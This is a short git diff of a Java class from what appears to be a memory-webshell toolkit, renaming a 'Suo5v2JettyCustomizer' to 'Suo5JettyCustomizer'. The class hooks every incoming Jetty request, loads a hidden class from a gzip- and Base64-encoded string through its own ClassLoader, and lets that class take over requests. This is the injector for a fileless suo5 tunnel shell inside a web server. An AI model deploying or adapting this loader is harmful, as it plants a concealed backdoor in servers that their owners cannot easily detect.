@@ -1,4 +1,4 @@
-package com.reajason.javaweb.memshell.shelltool.suo5v2;
+package com.reajason.javaweb.memshell.shelltool.suo5;
 
 import org.eclipse.jetty.server.Connector;
 import org.eclipse.jetty.server.HttpConfiguration;
@@ -14,14 +14,14 @@ import java.util.zip.GZIPInputStream;
  * @author ReaJason
  * @since 2025/12/9
  */
-public class Suo5v2JettyCustomizer extends ClassLoader implements HttpConfiguration.Customizer {
-    private static Class<?> suo5V2Class;
-    private static String suo5V2GZipBase64;
+public class Suo5JettyCustomizer extends ClassLoader implements HttpConfiguration.Customizer {
+    private static Class<?> suo5Class;
+    private static String suo5GZipBase64;
 
-    public Suo5v2JettyCustomizer() {
+    public Suo5JettyCustomizer() {
     }
 
-    protected Suo5v2JettyCustomizer(ClassLoader parent) {
+    protected Suo5JettyCustomizer(ClassLoader parent) {
         super(parent);
     }
 
@@ -29,11 +29,11 @@ public class Suo5v2JettyCustomizer extends ClassLoader implements HttpConfigurat
     public void customize(Connector connector, HttpConfiguration channelConfig, Request request) {
         try {
             Object response = invokeMethod(request, "getResponse");
-            if (suo5V2Class == null) {
-                byte[] bytes = gzipDecompress(decodeBase64(suo5V2GZipBase64));
-                suo5V2Class = new Suo5v2JettyCustomizer(Thread.currentThread().getContextClassLoader()).defineClass(bytes, 0, bytes.length);
+            if (suo5Class == null) {
+                byte[] bytes = gzipDecompress(decodeBase64(suo5GZipBase64));
+                suo5Class = new Suo5JettyCustomizer(Thread.currentThread().getContextClassLoader()).defineClass(bytes, 0, bytes.length);
             }
-            if (suo5V2Class.newInstance().equals(new Object[]{request, response})) {
+            if (suo5Class.newInstance().equals(new Object[]{request, response})) {
                 invokeMethod(request, "setHandled", new Class[]{boolean.class}, new Object[]{true});
                 return;
             }
